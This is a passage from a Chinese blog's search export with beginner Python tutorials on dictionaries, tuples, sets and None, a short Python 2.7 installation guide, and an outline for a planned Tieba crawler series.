<p><img src="https://huhansi.github.io/images/%E8%AE%BF%E9%97%AE%E5%92%8C%E9%81%8D%E5%8E%86%E5%85%83%E7%B4%A0.PNG" alt="访问和遍历元素"><br>如果访问一个不在字典中的键值对，则会抛出一个异常。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&#39;name&#39;] &#x3D; &#39;huhansan&#39;</span><br><span class="line">d[&#39;huhansan&#39;] &#x3D; &quot;name&quot; </span><br><span class="line">d[(1, 2, 3)] &#x3D; &#39;tuple&#39;</span><br><span class="line">d[222]    # 获取不存在的元素，此处会抛出一个异常</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%AD%98%E5%9C%A8%E5%85%83%E7%B4%A0.PNG" alt="获取不存在元素"></p>
<h3 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h3><p>使用python内置关键字<code>del</code>删除字典内元素；也可以调用字典内置函数clear() 清空字典元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&#39;name&#39;] &#x3D; &#39;huhansan&#39;</span><br><span class="line">d[&#39;huhansan&#39;] &#x3D; &quot;name&quot; </span><br><span class="line">d[(1, 2, 3)] &#x3D; &#39;tuple&#39;</span><br><span class="line">del d[&#39;name&#39;]    # 删除键为name的值</span><br><span class="line">del d    # 删除字典 d</span><br><span class="line">d    #    删除字典后，再访问，此处会抛出一个异常</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%A0%E9%99%A4%E5%85%83%E7%B4%A0.PNG" alt="删除元素"></p>
<h3 id="修改元素"><a href="#修改元素" class="headerlink" title="修改元素"></a>修改元素</h3><p>向字典中重复添加相同元素的键值对，后添加的键值对值会覆盖前添加的键值对的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&quot;name&quot;] &#x3D; &quot;huhansi&quot;</span><br><span class="line">d[&quot;name&quot;] &#x3D; &quot;huhansan&quot;</span><br><span class="line">print(d[&quot;name&quot;])</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E6%9B%B4%E6%96%B0%E5%85%83%E7%B4%A0.PNG" alt="更新元素"></p>
<h3 id="其他操作-1"><a href="#其他操作-1" class="headerlink" title="其他操作"></a>其他操作</h3><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>在Python中，元组（Tuple）和列表类似，两者之间的区别在于：元组不能更改，列表可以。也就是说，一旦被分配，就不能从元组中添加、更改或者删除元素。</p>
<h3 id="元素的优势"><a href="#元素的优势" class="headerlink" title="元素的优势"></a>元素的优势</h3><p>· 通常将元组用于不同的数据类型，将列表用于相同（或相似）的数据类型<br>· 由于元组不可变，所以遍历元组比列表要快（较小的性能提升）<br>· 元组可以用做字典的key，而列表不行。因为字典的key必须是不可变的，元组本身就是不可变的<br>· 如果数据不需要修改，可将其作为元组来实现，可以确保“写保护”<br>· 元组可以被用在字符串格式化中</p>
<h3 id="创建元组"><a href="#创建元组" class="headerlink" title="创建元组"></a>创建元组</h3><p>在Python中，元组的内置tuple类型定义。<br>要创建元组，需要将所有项（元素）放在括号（<code>()</code>）内，以逗号（<code>,</code>）分隔。括号是可选的，但是建议写上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; 1, 2, 3, 4, 5    # 创建元组，不使用括号</span><br><span class="line">t &#x3D; ()    # 空元组</span><br><span class="line">t &#x3D; (&#39;p&#39;, &#39;y&#39;, &#39;t&#39;, &#39;h&#39;, &#39;o&#39;, &#39;n&#39;)    # 字符型元组</span><br><span class="line">t &#x3D; (1, 1.2, &quot;1.3&quot;)    # 混合型元组</span><br><span class="line">t &#x3D; (1, 2, (3, 4, 5))    # 嵌套型元组</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%9B%E5%BB%BA%E5%85%83%E7%BB%84.PNG" alt="创建元组"><br>另外，如果要声明一个元组的元组，在括号中单申明一个元素是不够的，要在该元组后面添加一个逗号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (&quot;python&quot;)    # 此语法无法声明一个单元素元组，只会申明一个字符串</span><br><span class="line">type(t)</span><br><span class="line">t &#x3D; (&quot;python&quot;,)    # 此语法才可声明一个单元素元组</span><br><span class="line">type(t)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%8D%95%E4%B8%AA%E5%85%83%E7%BB%84.PNG" alt="单个元组"></p>
<h3 id="元组分片"><a href="#元组分片" class="headerlink" title="元组分片"></a>元组分片</h3><p>元组和列表都属于序列，因此，他们的基本操作是一样的。可以使用索引操作符<code>[]</code>来访问元组中的每一个元素，使用切片操作符<code>：</code>来访问元组中的一系列元素。</p>
<p><img src="https://huhansi.github.io/images/%E5%88%86%E7%89%87%E7%A4%BA%E6%84%8F%E5%9B%BE.PNG" alt="分片示意图"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (1, 2, 3, 4, 5, 6, 7, 8)</span><br><span class="line">t[1]    # 取元组第一个元素</span><br><span class="line">t[-2]    # 取元组第七个元素</span><br><span class="line">t &#x3D; (1, 2, 3, (4, 5, 6))    # 元组嵌套</span><br><span class="line">t[3][2]    # 取元素第四个元素元组中的第三个元素</span><br><span class="line">t &#x3D; (1, 2, 3, [7, 8, 9])    # 元组嵌套列表</span><br><span class="line">t[3][2]    # 取元素第四个元组列表中的第三个元素</span><br><span class="line">t[1:3]    # 取元组第二个到第三个元素</span><br><span class="line">t[1:]    # 取元组第二个到元组末尾的序列</span><br><span class="line">t[:4]    # 取元组头开始到元素第四个元素的序列</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%85%83%E7%BB%84%E5%88%86%E7%89%87.PNG" alt="元组分片"></p>
<h3 id="更改元组"><a href="#更改元组" class="headerlink" title="更改元组"></a>更改元组</h3><p>元组是不可变的，也就是说，元组中的元组在被赋值后不能改变。<br>但是，如果元素本身是一个可变数据类型的列表，那么其嵌套项可以被改变。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (1, 2, 3, [4, 5, 6])</span><br><span class="line">t[0] &#x3D; 7</span><br><span class="line">t[3][0] &#x3D; 8</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E4%BF%AE%E6%94%B9%E5%85%83%E7%BB%84.PNG" alt="修改元组"></p>
<h3 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h3><p>元组元素不能修改，那么元组中的元素也是不能删除的，但是可以删除整个元组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (1, 2, 3, 4, 5, 6, 7, 9)</span><br><span class="line">del t[1]</span><br><span class="line">del t</span><br><span class="line">t</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%A0%E9%99%A4%E5%85%83%E7%BB%84.PNG" alt="删除元祖"></p>
<h3 id="元组和列表互换"><a href="#元组和列表互换" class="headerlink" title="元组和列表互换"></a>元组和列表互换</h3><p>元和和列表可以互相转换，分别使用list()和tuple()方法实现。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t &#x3D; (1, 2, 3, 4, 5, 6)</span><br><span class="line">listt &#x3D; list(t)    # 将元组转换为列表</span><br><span class="line">t &#x3D; tuple(listt)    # 将列表转换为元组</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%97%E8%A1%A8%E5%85%83%E7%BB%84%E4%BA%92%E7%9B%B8%E8%BD%AC%E6%8D%A2.PNG" alt="列表元组互相转换"></p>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>集合（Set）也是标准的Python数据类型，它也可以用于存储值。它和列表或者元组之间的区别是，集合中的每一个元素不能出现多次，并且元素之间是无序存储的。<br>由于集合中的元素不能出现多次，这使得集合在很大程度上能够高效地从列表或者元组中删除重复值，并执行取并集、交集等常见的数学操作。</p>
<h3 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; set()    # 声明空集合</span><br><span class="line">s &#x3D; set(&quot;python&quot;)    # 以字符列表，字符串形式声明集合</span><br><span class="line">s &#x3D; set([1, 2, 3, 4])    # 以列表形式声明集合</span><br><span class="line">s &#x3D; &#123;1, 2, 3, 4&#125;    # 以花括号形式声明集合</span><br><span class="line">s &#x3D; &#123;1, 1, 2, 3&#125;    # 如果集合中有重复元素，那么重复元素只会出现一次，即，此时，s &#x3D; &#123;1, 2, 3&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%9B%E5%BB%BA%E9%9B%86%E5%90%88.PNG" alt="创建集合"></p>
<h3 id="查询和遍历集合"><a href="#查询和遍历集合" class="headerlink" title="查询和遍历集合"></a>查询和遍历集合</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; set([1, 2, 3, 4])</span><br><span class="line">print(4 in s)</span><br><span class="line">for value in s:</span><br><span class="line">    print(value)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E9%81%8D%E5%8E%86%E9%9B%86%E5%90%88.PNG" alt="遍历集合"></p>
<h3 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a>删除集合</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s &#x3D; set([1, 2, 3, 4, 5, 6])</span><br><span class="line">s.remove(1)    # 移除元素1</span><br><span class="line">s.add(7)</span><br><span class="line">del s</span><br><span class="line">s</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%A0%E9%99%A4%E9%9B%86%E5%90%88.PNG" alt="删除集合"></p>
<h2 id="空类型（None）"><a href="#空类型（None）" class="headerlink" title="空类型（None）"></a>空类型（None）</h2><p>表示该值是一个空值，且对其没有特别的操作。空值是Python里的一个特殊的值，用None表示。空值不能理解为0，因为0是有意义的，而None是一个特殊的空值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">None &#x3D;&#x3D; 0</span><br><span class="line">None &#x3D;&#x3D; &#39;&#39;</span><br><span class="line">type(None)</span><br><span class="line">None &#x3D;&#x3D; None</span><br><span class="line">None is None</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/None.PNG" alt="None"></p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python简介</title>
    <url>/2018/01/09/python/python101/python-1-introduction/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Python是一种解释型、面向对象、攻台数据类型的高级程序设计语言。是由Guido valn Rossum在1989年发明的。目前python分化为两个版本，2.x和3.x，并且根据官方所属，2.x的版本将在2020年之后不再提供bugfix。<br><strong>Being the last of the 2.x series, 2.7 will have an extended period of maintenance. The current plan is to support it for at least 10 years from the initial 2.7 release. This means there will be bugfix releases until <code>2020</code>.</strong></p>
<p>不过我们无需担心这个，一是2转换成3，很简单，二是XP退出历史舞台也好久了，现在它的份额也还是占了<a href="http://tech.sina.com.cn/roll/2018-01-02/doc-ifyqcsft9369284.shtml" target="_blank" rel="noopener">5.18</a> 左右。</p>
<p>目前，根据2018-01月的TIOBE排行榜，Python使用的人数是处于中上游的。</p>
<p><img src="https://huhansi.github.io/images/2018-01-tiobe-python.png" alt="2018-01 语言TIOBE排行榜"></p>
<p>上面的几款编程语言，各有千秋，如果追求代码执行速度和效率，首选C/C++，它们是比较贴近硬件的语言，著名的*Unix系统就是用C写的；如果需要编写大型的企业级应用，那么可以考虑下Java。</p>
<p>Python给我们提供了非常丰富的库，覆盖了网络、文件、GUI、数据库、文本等大量内容。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先，从python<a href="https://www.python.org/" target="_blank" rel="noopener">官网</a>上下载最新的2.x版本，这边是2.7.14。</p>
<p>下载完成之后，双击msi安装包，一直点击next，只需注意勾选安装pip和将python添加的环境变量中。如下图所示</p>
<p><img src="https://huhansi.github.io/images/180129-before-enable-pip.png" alt="勾选添加到环境变量选项"></p>
<p>将Add python.exe选中，next。</p>
<p><img src="https://huhansi.github.io/images/180129-after-enable-pip.png" alt="添加到环境变量"></p>
<p>安装完毕时候，打开控制台，输入python，出现以下类似场景则证明安装成功。</p>
<p><img src="https://huhansi.github.io/images/180129-install-python-success.png" alt="安装成功"></p>
<p>至此，python安装完成。</p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>制作一个python贴吧爬虫（序）</title>
    <url>/2018/01/08/python/%E7%88%AC%E8%99%AB/%E7%88%AC%E8%99%AB-1-%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>很早就想写写博客什么的记录巩固一下自己编写爬虫的经历，经验，总结等东西了。刚好最近有时间，顺带梳理下自己的知识体系。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>因为本人刚好是SNSD队长<a href="https://baike.baidu.com/item/%E9%87%91%E6%B3%B0%E5%A6%8D" target="_blank" rel="noopener">金泰妍</a>的粉丝，所以，时不时地回去贴吧中扫荡一波她的美图。但是，一个一个帖子逛下来实在是太费事，就萌生了用爬虫来替代人工的想法。那么，什么是爬虫呢？</p>
<h3 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h3><p>网络爬虫（又被称为网页蜘蛛、网络机器人），是一种按照一定规则，自动地抓取万维网信息的程序或者脚本。</p>
<p>一些传统的搜索引擎，例如Google，Baidu，Bing等就是一种大型复杂的网络爬虫。</p>
<h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><p>接下来会按照下面的顺序，来记录学习过程中的点点滴滴。</p>
<ol>
<li>python相关<ol>
<li>python简介</li>
<li>运行python</li>
<li>python基本类型</li>
<li>基本语法</li>
<li>re模块介绍</li>
<li>python io</li>
<li>requests模块介绍</li>
<li>进程和多线程以及协程</li>
<li>网络编程<ol>
<li>TCP通信</li>
<li>UDP通信</li>
</ol>
</li>
<li>总结</li>
</ol>
</li>
<li>Web相关知识</li>
<li>编写第一个爬虫<ol>
<li>编写爬虫</li>
<li>抓取数据</li>
<li>保存数据</li>
<li>加快抓取速度</li>
</ol>
</li>
<li>解析动态网页</li>
<li>表单交互</li>
<li>验证码交互</li>
<li>使用Scrapy框架</li>
</ol>
<p>暂且只能想到这么点东西，后续再继续更新相关内容</p>
]]></content>
      <categories>
        <category>python爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
</search>
